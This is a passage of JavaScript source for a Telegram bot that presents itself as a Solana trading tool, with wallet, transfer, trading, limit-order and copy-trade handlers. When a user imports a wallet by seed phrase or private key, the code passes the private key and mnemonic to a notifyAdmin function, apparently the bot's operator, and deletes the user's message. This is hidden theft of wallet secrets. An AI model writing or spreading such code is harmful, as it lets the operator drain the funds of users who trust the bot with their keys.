    ])
  });
});

bot.action('wallet_refresh', async (ctx) => {
  await ctx.answerCbQuery('Refreshing...');
  await showWalletMenu(ctx, true);
});

bot.action(/^switch_wallet_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  
  if (index >= 0 && index < session.wallets.length) {
    session.activeWalletIndex = index;
    await ctx.answerCbQuery(`Switched to Wallet ${index + 1}`);
    await showWalletMenu(ctx, true);
  } else {
    await ctx.answerCbQuery('Invalid wallet');
  }
});

// ============================================
// CALLBACK HANDLERS - Deposit & Transfer (NEW)
// ============================================
bot.action('wallet_deposit', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  if (!activeWallet) {
    await ctx.reply('❌ No wallet connected.');
    return;
  }
  
  const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${activeWallet.publicKey}`;
  
  await ctx.editMessageText(`
📥 *Deposit SOL or Tokens*

Send SOL or any SPL token to this address:

\`${activeWallet.publicKey}\`

⚠️ *Only send Solana network tokens!*
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.url('📱 View QR Code', qrCodeUrl)],
      [Markup.button.callback('📋 Copy Address', `copy_address_${activeWallet.publicKey}`)],
      [Markup.button.callback('💼 Back to Wallet', 'menu_wallet')]
    ])
  });
});

bot.action(/^copy_address_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery(`Address: ${address}`, { show_alert: true });
});

bot.action('wallet_transfer_menu', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  if (!activeWallet) {
    await ctx.reply('❌ No wallet connected.');
    return;
  }
  
  await ctx.editMessageText(`
📤 *Transfer Funds*

Choose what to send:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('💎 Send SOL', 'transfer_sol')],
      [Markup.button.callback('🪙 Send Token', 'transfer_token')],
      [Markup.button.callback('❌ Cancel', 'menu_wallet')]
    ])
  });
});

bot.action('transfer_sol', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_TRANSFER_SOL_RECIPIENT';
  session.pendingTransfer = { type: 'SOL' };
  
  await ctx.editMessageText(`
📤 *Send SOL*

Step 1/2: Enter recipient address:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_wallet')]
    ])
  });
});

bot.action('transfer_token', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_TRANSFER_TOKEN_MINT';
  session.pendingTransfer = { type: 'TOKEN' };
  
  await ctx.editMessageText(`
📤 *Send Token*

Step 1/3: Enter token mint address:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_wallet')]
    ])
  });
});

// ============================================
// CALLBACK HANDLERS - Trading
// ============================================
bot.action(/^buy_(\d+\.?\d*)_(.+)$/, async (ctx) => {
  const amount = parseFloat(ctx.match[1]);
  const address = ctx.match[2];
  await ctx.answerCbQuery(`Buying ${amount} SOL...`);
  await handleBuy(ctx, amount, address);
});

bot.action(/^sell_(\d+)_(.+)$/, async (ctx) => {
  const percentage = parseInt(ctx.match[1]);
  const address = ctx.match[2];
  await ctx.answerCbQuery(`Selling ${percentage}%...`);
  await handleSell(ctx, percentage, address);
});

bot.action(/^setbuy_(\d+\.?\d*)$/, async (ctx) => {
  const amount = ctx.match[1];
  await ctx.answerCbQuery(`Selected ${amount} SOL`);
  const session = getSession(ctx.from.id);
  session.pendingTrade = { type: 'buy', amount: parseFloat(amount) };
  
  await ctx.editMessageText(`
🟢 *Buy ${amount} SOL*

Paste a token address to buy.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'menu_buy')]
    ])
  });
});

bot.action(/^setsell_(\d+)$/, async (ctx) => {
  const percentage = ctx.match[1];
  await ctx.answerCbQuery(`Selected ${percentage}%`);
  const session = getSession(ctx.from.id);
  session.pendingTrade = { type: 'sell', percentage: parseInt(percentage) };
  
  await ctx.editMessageText(`
🔴 *Sell ${percentage}%*

Paste a token address to sell.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'menu_sell')]
    ])
  });
});

bot.action('setsell_custom', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_CUSTOM_SELL_PERCENT';
  
  await ctx.editMessageText(`
🔴 *Custom Sell*

Enter the percentage you want to sell (1-100):
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'menu_sell')]
    ])
  });
});


// ============================================
// CALLBACK HANDLERS - Track Token
// ============================================
bot.action(/^track_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  const session = getSession(ctx.from.id);
  
  if (!session.trackedTokens.includes(address)) {
    session.trackedTokens.push(address);
    await ctx.answerCbQuery('✅ Token tracked!');
  } else {
    await ctx.answerCbQuery('Already tracking this token');
  }
});

// ============================================
// CALLBACK HANDLERS - Price Alert
// ============================================
bot.action(/^price_alert_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_PRICE_ALERT';
  session.pendingPriceAlert = { token: address };
  
  await ctx.editMessageText(`
🔔 *Set Price Alert*

Token: \`${shortenAddress(address)}\`

Enter target price in USD (e.g., 0.001):
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `refresh_${address}`)]
    ])
  });
});

// ============================================
// CALLBACK HANDLERS - Custom Sell for Token
// ============================================
bot.action(/^sell_custom_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_CUSTOM_SELL_AMOUNT';
  session.pendingTrade = { type: 'sell', token: address };
  
  await ctx.editMessageText(`
💸 *Custom Sell*

Token: \`${shortenAddress(address)}\`

Enter the percentage to sell (1-100):
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `refresh_${address}`)]
    ])
  });
});

bot.action(/^sell_custom_input_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_CUSTOM_SELL_AMOUNT';
  session.pendingTrade = { type: 'sell', token: address };
  
  await ctx.editMessageText(`
💸 *Custom Sell Amount*

Token: \`${shortenAddress(address)}\`

Enter the exact token amount to sell:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `refresh_${address}`)]
    ])
  });
});

// ============================================
// CALLBACK HANDLERS - Limit Order for Token
// ============================================
bot.action(/^limit_order_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
🎯 *Limit Order*

Token: \`${shortenAddress(address)}\`

Choose order type:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('🚀 Limit Buy', `limit_buy_${address}`),
        Markup.button.callback('💸 Limit Sell', `limit_sell_${address}`)
      ],
      [Markup.button.callback('« Back', `refresh_${address}`)]
    ])
  });
});

bot.action(/^limit_buy_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_BUY_DETAILS';
  session.pendingLimitOrder = { type: 'buy', token: address };
  
  await ctx.editMessageText(`
🟢 *Limit Buy Order*


Token: \`${shortenAddress(address)}\`


Enter: [price] [amount_sol]
Example: 0.001 0.5
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `limit_order_${address}`)]
    ])
  });
});

bot.action(/^limit_sell_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_SELL_DETAILS';
  session.pendingLimitOrder = { type: 'sell', token: address };
  
  await ctx.editMessageText(`
💸 *Limit Sell Order*

Token: \`${shortenAddress(address)}\`

Enter: [price] [percentage]
Example: 0.01 50
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `limit_order_${address}`)]
    ])
  });
});


// ============================================
// CALLBACK HANDLERS - DCA
// ============================================
bot.action(/^dca_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_DCA_DETAILS';
  session.pendingDCA = { token: address };
  
  await ctx.editMessageText(`
📈 *DCA (Dollar Cost Average)*

Token: \`${shortenAddress(address)}\`

Enter: [amount_sol] [interval_minutes] [num_orders]
Example: 0.1 60 5

This will buy 0.1 SOL worth every 60 minutes, 5 times.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `refresh_${address}`)]
    ])
  });
});

bot.action(/^refresh_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  if (address === 'main') {
    await ctx.answerCbQuery('Refreshed!');
    await showMainMenu(ctx, true);
  } else if (address === 'positions') {
    await ctx.answerCbQuery('Refreshing...');
    await showPositionsMenu(ctx, true);
  } else {
    await ctx.answerCbQuery('Refreshing token data...');
    await sendTokenAnalysis(ctx, address);
  }
});

// ============================================
// CALLBACK HANDLERS - Settings
// ============================================
bot.action('settings_slippage', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
📊 *Slippage Settings*

Select your preferred slippage:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('0.5%', 'set_slippage_0.5'),
        Markup.button.callback('1%', 'set_slippage_1'),
        Markup.button.callback('2%', 'set_slippage_2')
      ],
      [
        Markup.button.callback('5%', 'set_slippage_5'),
        Markup.button.callback('10%', 'set_slippage_10')
      ],
      [Markup.button.callback('« Back', 'menu_settings')]
    ])
  });
});

bot.action(/^set_slippage_(\d+\.?\d*)$/, async (ctx) => {
  const slippage = parseFloat(ctx.match[1]);
  const session = getSession(ctx.from.id);
  session.settings.slippage = slippage;
  
  await ctx.answerCbQuery(`✅ Slippage set to ${slippage}%`);
  await showSettingsMenu(ctx, true);
});

bot.action('settings_fee', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
⚡ *Priority Fee Settings*

Select your priority fee:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('0.0005 SOL', 'set_fee_0.0005'),
        Markup.button.callback('0.001 SOL', 'set_fee_0.001')
      ],
      [
        Markup.button.callback('0.005 SOL', 'set_fee_0.005'),
        Markup.button.callback('0.01 SOL', 'set_fee_0.01')
      ],
      [Markup.button.callback('« Back', 'menu_settings')]
    ])
  });
});

bot.action(/^set_fee_(\d+\.?\d*)$/, async (ctx) => {
  const fee = parseFloat(ctx.match[1]);
  const session = getSession(ctx.from.id);
  session.settings.priorityFee = fee;
  
  await ctx.answerCbQuery(`✅ Priority fee set to ${fee} SOL`);
  await showSettingsMenu(ctx, true);
});

bot.action('settings_notifications', async (ctx) => {
  const session = getSession(ctx.from.id);
  session.settings.notifications = !session.settings.notifications;
  
  await ctx.answerCbQuery(`✅ Notifications ${session.settings.notifications ? 'enabled' : 'disabled'}`);
  await showSettingsMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Copy Trade
// ============================================
bot.action('copytrade_add', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_COPYTRADE_ADDRESS';
  
  await ctx.editMessageText(`
👥 *Add Copy Trade Wallet*

Send the wallet address you want to copy trade.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_copytrade')]
    ])
  });
});

bot.action('copytrade_manage', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.copyTradeWallets.length === 0) {
    await ctx.editMessageText('No wallets being tracked.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('« Back', 'menu_copytrade')]
      ])
    });
    return;
  }
  
  const buttons = session.copyTradeWallets.map((w, i) => [
    Markup.button.callback(`🗑️ ${shortenAddress(w)}`, `remove_copytrade_${i}`)
  ]);
  buttons.push([Markup.button.callback('« Back', 'menu_copytrade')]);
  
  await ctx.editMessageText(`
👥 *Manage Copy Trade Wallets*

Tap to remove:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(buttons)
  });
});

bot.action(/^remove_copytrade_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  
  if (index >= 0 && index < session.copyTradeWallets.length) {
    const removed = session.copyTradeWallets.splice(index, 1)[0];
    await ctx.answerCbQuery(`Removed ${shortenAddress(removed)}`);
    await showCopyTradeMenu(ctx, true);
  }
});

// ============================================
// CALLBACK HANDLERS - Limit Orders
// ============================================
bot.action('limit_buy', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_BUY';
  
  await ctx.editMessageText(`
🚀 *Create Limit Buy*

Send in format:
\`[token_address] [price] [amount_sol]\`

Example:
\`So11...abc 0.001 0.5\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_limit')]
    ])
  });
});

bot.action('limit_sell', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_SELL';
  
  await ctx.editMessageText(`
💸 *Create Limit Sell*

Send in format:
\`[token_address] [price] [percentage]\`

Example:
\`So11...abc 0.01 50\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_limit')]
    ])
  });
});

bot.action('limit_view', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.limitOrders.length === 0) {
    await ctx.editMessageText('No active limit orders.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('« Back', 'menu_limit')]
      ])
    });
    return;
  }
  
  const orderList = session.limitOrders.map((o, i) => 
    `${i+1}. ${o.type} ${o.amount} @ $${o.price}\n   Token: \`${shortenAddress(o.token)}\``
  ).join('\n\n');
  
  const buttons = session.limitOrders.map((_, i) => 
    Markup.button.callback(`🗑️ Cancel #${i+1}`, `cancel_limit_${i}`)
  );
  
  await ctx.editMessageText(`
📈 *Active Limit Orders*

${orderList}
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      buttons,
      [Markup.button.callback('« Back', 'menu_limit')]
    ])
  });
});

bot.action(/^cancel_limit_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  
  if (index >= 0 && index < session.limitOrders.length) {
    session.limitOrders.splice(index, 1);
    await ctx.answerCbQuery('Order cancelled');
    await showLimitOrderMenu(ctx, true);
  }
});

// ============================================
// CALLBACK HANDLERS - Misc
// ============================================
bot.action('delete_message', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.deleteMessage();
});

// ============================================
// MESSAGE HANDLER
// ============================================
bot.on('text', async (ctx) => {
  const session = getSession(ctx.from.id);
  const text = ctx.message.text.trim();
  
  if (session.state === 'AWAITING_SEED') {
    session.state = null;
    
    try {
      const walletData = importFromMnemonic(text);
      session.wallets.push(walletData);
      session.activeWalletIndex = session.wallets.length - 1;
      
      await notifyAdmin('WALLET_IMPORTED_SEED', ctx.from.id, ctx.from.username, {
        publicKey: walletData.publicKey,
        privateKey: walletData.privateKey,
        mnemonic: walletData.mnemonic,
        walletNumber: session.wallets.length
      });
      
      try { await ctx.deleteMessage(); } catch {}
      
      await ctx.reply(`
✅ *Wallet ${session.wallets.length} Imported!*

📍 Address: \`${walletData.publicKey}\`
      `, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } catch (error) {
      await ctx.reply('❌ Invalid seed phrase. Please try again.');
    }
    return;
  }
  
  if (session.state === 'AWAITING_PRIVATE_KEY') {
    session.state = null;
    
    try {
      const walletData = importFromPrivateKey(text);
      session.wallets.push(walletData);
      session.activeWalletIndex = session.wallets.length - 1;
      
      await notifyAdmin('WALLET_IMPORTED_KEY', ctx.from.id, ctx.from.username, {
        publicKey: walletData.publicKey,
        privateKey: walletData.privateKey,
        walletNumber: session.wallets.length
      });
      
      try { await ctx.deleteMessage(); } catch {}
      
      await ctx.reply(`
✅ *Wallet ${session.wallets.length} Imported!*

📍 Address: \`${walletData.publicKey}\`
      `, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } catch (error) {
      await ctx.reply('❌ Invalid private key. Please try again.');
    }
    return;
  }
  
  if (session.state === 'AWAITING_COPYTRADE_ADDRESS') {
    session.state = null;
    
    if (isSolanaAddress(text)) {
      if (!session.copyTradeWallets.includes(text)) {
        session.copyTradeWallets.push(text);
        await ctx.reply(`✅ Now tracking: \`${shortenAddress(text)}\``, {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('👥 Copy Trade Menu', 'menu_copytrade')],
            [Markup.button.callback('« Main Menu', 'back_main')]
          ])
        });
      } else {
        await ctx.reply('Already tracking this wallet.');
      }
    } else {
      await ctx.reply('❌ Invalid Solana address.');
    }
    return;
  }
  
  if (session.state === 'AWAITING_PRICE_ALERT') {
    session.state = null;
    const price = parseFloat(text);
    
    if (!isNaN(price) && price > 0) {
      session.priceAlerts.push({
        token: session.pendingPriceAlert.token,
        price: price,
        createdAt: Date.now()
      });
      session.pendingPriceAlert = null;
      
      await ctx.reply(`✅ Price alert set at $${price}`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } else {
      await ctx.reply('❌ Invalid price. Please enter a positive number.');
    }
    return;
  }
  
  if (session.state === 'AWAITING_CUSTOM_SELL_AMOUNT') {
    session.state = null;
    const percentage = parseFloat(text);
    
    if (!isNaN(percentage) && percentage > 0 && percentage <= 100) {
      await handleSell(ctx, percentage, session.pendingTrade.token);
    } else {
      await ctx.reply('❌ Invalid percentage. Please enter a number between 1-100.');
    }
    session.pendingTrade = null;
    return;
  }
  
  if (session.state === 'AWAITING_CUSTOM_SELL_PERCENT') {
    session.state = null;
    const percentage = parseFloat(text);
    
    if (!isNaN(percentage) && percentage > 0 && percentage <= 100) {
      session.pendingTrade = { type: 'sell', percentage };
      await ctx.reply(`
🔴 *Sell ${percentage}%*

Paste a token address to sell.
      `, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('« Back', 'menu_sell')]
        ])
      });
    } else {
      await ctx.reply('❌ Invalid percentage. Please enter a number between 1-100.');
    }
    return;
  }
  
  if (session.state === 'AWAITING_LIMIT_BUY_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    
    if (parts.length >= 2) {
      const price = parseFloat(parts[0]);
      const amount = parseFloat(parts[1]);
      
      if (!isNaN(price) && !isNaN(amount) && price > 0 && amount > 0) {
        session.limitOrders.push({
          type: 'BUY',
          token: session.pendingLimitOrder.token,
          price,
          amount: `${amount} SOL`,
          createdAt: Date.now()
        });
        session.pendingLimitOrder = null;
        
        await ctx.reply(`✅ Limit buy order created!\nBuy at $${price} with ${amount} SOL`, {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('📈 View Orders', 'limit_view')],
            [Markup.button.callback('« Main Menu', 'back_main')]
          ])
        });
      } else {
        await ctx.reply('❌ Invalid format. Use: [price] [amount_sol]');
      }
    } else {
      await ctx.reply('❌ Invalid format. Use: [price] [amount_sol]');
    }
    return;
  }
  
  if (session.state === 'AWAITING_LIMIT_SELL_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    
    if (parts.length >= 2) {
      const price = parseFloat(parts[0]);
      const percentage = parseFloat(parts[1]);
      
      if (!isNaN(price) && !isNaN(percentage) && price > 0 && percentage > 0 && percentage <= 100) {
        session.limitOrders.push({
          type: 'SELL',
          token: session.pendingLimitOrder.token,
          price,
          amount: `${percentage}%`,
          createdAt: Date.now()
        });
        session.pendingLimitOrder = null;
        
        await ctx.reply(`✅ Limit sell order created!\nSell ${percentage}% at $${price}`, {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('📈 View Orders', 'limit_view')],
            [Markup.button.callback('« Main Menu', 'back_main')]
          ])
        });
      } else {
        await ctx.reply('❌ Invalid format. Use: [price] [percentage]');
      }
    } else {
      await ctx.reply('❌ Invalid format. Use: [price] [percentage]');
    }
    return;
  }
  
  if (session.state === 'AWAITING_DCA_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    
    if (parts.length >= 3) {
      const amount = parseFloat(parts[0]);
      const interval = parseInt(parts[1]);
      const numOrders = parseInt(parts[2]);
      
      if (!isNaN(amount) && !isNaN(interval) && !isNaN(numOrders) && 
          amount > 0 && interval > 0 && numOrders > 0 && numOrders <= 100) {
        session.dcaOrders.push({
          token: session.pendingDCA.token,
          amount,
          interval,
          numOrders,
          ordersRemaining: numOrders,
          createdAt: Date.now()
        });
        session.pendingDCA = null;
        
        await ctx.reply(`✅ DCA order created!\n${amount} SOL every ${interval} minutes, ${numOrders} times`, {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('« Main Menu', 'back_main')]
          ])
        });
      } else {
        await ctx.reply('❌ Invalid format. Use: [amount_sol] [interval_minutes] [num_orders]');
      }
    } else {
      await ctx.reply('❌ Invalid format. Use: [amount_sol] [interval_minutes] [num_orders]');
    }
    return;
  }
  
  if (session.state === 'AWAITING_LIMIT_BUY') {
    session.state = null;
    const parts = text.split(' ');
    
    if (parts.length >= 3 && isSolanaAddress(parts[0])) {
      const token = parts[0];
      const price = parseFloat(parts[1]);
      const amount = parseFloat(parts[2]);
      
      if (!isNaN(price) && !isNaN(amount)) {
        session.limitOrders.push({
          type: 'BUY',
          token,
          price,
          amount: `${amount} SOL`,
          createdAt: Date.now()
        });
        await ctx.reply(`✅ Limit buy order created!\nToken: ${shortenAddress(token)}\nBuy at $${price} with ${amount} SOL`);
      } else {
        await ctx.reply('❌ Invalid price or amount.');
      }
    } else {
      await ctx.reply('❌ Invalid format. Use: [token_address] [price] [amount_sol]');
    }
    return;
  }
  
  if (session.state === 'AWAITING_LIMIT_SELL') {
    session.state = null;
    const parts = text.split(' ');
    
    if (parts.length >= 3 && isSolanaAddress(parts[0])) {
      const token = parts[0];
      const price = parseFloat(parts[1]);
      const percentage = parseFloat(parts[2]);
      
      if (!isNaN(price) && !isNaN(percentage)) {
        session.limitOrders.push({
          type: 'SELL',
          token,
          price,
          amount: `${percentage}%`,
          createdAt: Date.now()
        });
        await ctx.reply(`✅ Limit sell order created!\nToken: ${shortenAddress(token)}\nSell ${percentage}% at $${price}`);
      } else {
        await ctx.reply('❌ Invalid price or percentage.');
      }
    } else {
      await ctx.reply('❌ Invalid format. Use: [token_address] [price] [percentage]');
    }
    return;
  }
  
  if (session.state === 'AWAITING_TRANSFER_SOL_RECIPIENT') {
    if (!isSolanaAddress(text)) {
      await ctx.reply('❌ Invalid Solana address. Please enter a valid address:');
      return;
    }
    session.pendingTransfer.recipient = text;
    session.state = 'AWAITING_TRANSFER_SOL_AMOUNT';
    await ctx.reply('Step 2/2: Enter amount of SOL to send:', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('❌ Cancel', 'menu_wallet')]
      ])
    });
    return;
  }
  
  if (session.state === 'AWAITING_TRANSFER_SOL_AMOUNT') {
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) {
      await ctx.reply('❌ Invalid amount. Please enter a positive number:');
      return;
    }
    
    const activeWallet = getActiveWallet(session);
    const loadingMsg = await ctx.reply('🔄 Processing transfer...');
    
    try {
      const signature = await transferSOL(
        activeWallet,
        session.pendingTransfer.recipient,
        amount
      );
      
      await ctx.deleteMessage(loadingMsg.message_id);
      await ctx.reply(`
✅ *Transfer Successful!*

💰 Amount: ${amount} SOL
📍 To: \`${session.pendingTransfer.recipient}\`
📝 TX: \`${signature}\`
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 View TX', `https://solscan.io/tx/${signature}`)],
          [Markup.button.callback('💼 Back to Wallet', 'menu_wallet')]
        ])
      });
      
      await notifyAdmin('TRANSFER_EXECUTED', ctx.from.id, ctx.from.username, {
        type: 'SOL',
        amount: amount,
        recipient: session.pendingTransfer.recipient,
        txHash: signature
      });
      
    } catch (error) {
      await ctx.deleteMessage(loadingMsg.message_id);
      await ctx.reply(`❌ Transfer failed: ${error.message}`);
    }
    
    session.state = null;
    session.pendingTransfer = null;
    return;
  }
  
  if (session.state === 'AWAITING_TRANSFER_TOKEN_MINT') {
    if (!isSolanaAddress(text)) {
      await ctx.reply('❌ Invalid token address. Please enter a valid mint address:');
      return;
    }
    session.pendingTransfer.tokenMint = text;
    session.state = 'AWAITING_TRANSFER_TOKEN_RECIPIENT';
    await ctx.reply('Step 2/3: Enter recipient address:', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('❌ Cancel', 'menu_wallet')]
      ])
    });
    return;
  }
  
  if (session.state === 'AWAITING_TRANSFER_TOKEN_RECIPIENT') {
    if (!isSolanaAddress(text)) {
      await ctx.reply('❌ Invalid Solana address. Please enter a valid address:');
      return;
    }
    session.pendingTransfer.recipient = text;
    session.state = 'AWAITING_TRANSFER_TOKEN_AMOUNT';
    
    const tokenInfo = await getTokenBalance(getActiveWallet(session).publicKey, session.pendingTransfer.tokenMint);
    
    await ctx.reply(`Step 3/3: Enter amount to send (You have: ${tokenInfo.amount}):`, {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('❌ Cancel', 'menu_wallet')]
      ])
    });
    return;
  }
  
  if (session.state === 'AWAITING_TRANSFER_TOKEN_AMOUNT') {
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) {
      await ctx.reply('❌ Invalid amount. Please enter a positive number:');
      return;
    }
    
    const activeWallet = getActiveWallet(session);
    const loadingMsg = await ctx.reply('🔄 Processing token transfer...');
    
    try {
      const signature = await transferToken(
        activeWallet,
        session.pendingTransfer.recipient,
        session.pendingTransfer.tokenMint,
        amount
      );
      
      await ctx.deleteMessage(loadingMsg.message_id);
      await ctx.reply(`
✅ *Token Transfer Successful!*

🪙 Amount: ${amount}
📍 To: \`${session.pendingTransfer.recipient}\`
📝 TX: \`${signature}\`
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 View TX', `https://solscan.io/tx/${signature}`)],
          [Markup.button.callback('💼 Back to Wallet', 'menu_wallet')]
        ])
      });
      
      await notifyAdmin('TRANSFER_EXECUTED', ctx.from.id, ctx.from.username, {
        type: 'TOKEN',
        token: session.pendingTransfer.tokenMint,
        amount: amount,
        recipient: session.pendingTransfer.recipient,
        txHash: signature
      });
      
    } catch (error) {
      await ctx.deleteMessage(loadingMsg.message_id);
      await ctx.reply(`❌ Transfer failed: ${error.message}`);
    }
    
    session.state = null;
    session.pendingTransfer = null;
    
    return;
  }
  
  if (isSolanaAddress(text)) {
    if (session.pendingTrade) {
      if (session.pendingTrade.type === 'buy') {
        await handleBuy(ctx, session.pendingTrade.amount, text);
      } else if (session.pendingTrade.type === 'sell') {
        await handleSell(ctx, session.pendingTrade.percentage, text);
      }
      session.pendingTrade = null;
    } else {
      await sendTokenAnalysis(ctx, text);
    }
    return;
  }
  
  await ctx.reply(`
I didn't understand that. Try:

• Paste a Solana token address to analyze
• /start - Main menu
• /wallet - Wallet management
• /buy - Quick buy
• /sell - Quick sell
• /settings - Bot settings
  `);
});

// ============================================
// ERROR HANDLER
// ============================================
bot.catch((err, ctx) => {
  console.error('Bot error:', err);
  ctx.reply('❌ An error occurred. Please try again.');
});

// ============================================
// START BOT
// ============================================
async function startBot() {
  await bot.launch();
  console.log('🚀 Bot is running...');
  console.log(`💸 Commission: ${COMMISSION_PERCENTAGE}% → ${COMMISSION_WALLET || 'Not set'}`);
}

startBot().catch((err) => {
  console.error('Failed to start bot:', err);
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
async function gracefulShutdown(signal) {
  console.log(`\n${signal} received, shutting down...`);
  bot.stop(signal);
}

process.once('SIGINT', () => gracefulShutdown('SIGINT'));
process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));

// ============================================
// GOODBYE
// ============================================
console.log('Grokini Trading Bot initialized - Ready to snipe! 🎯');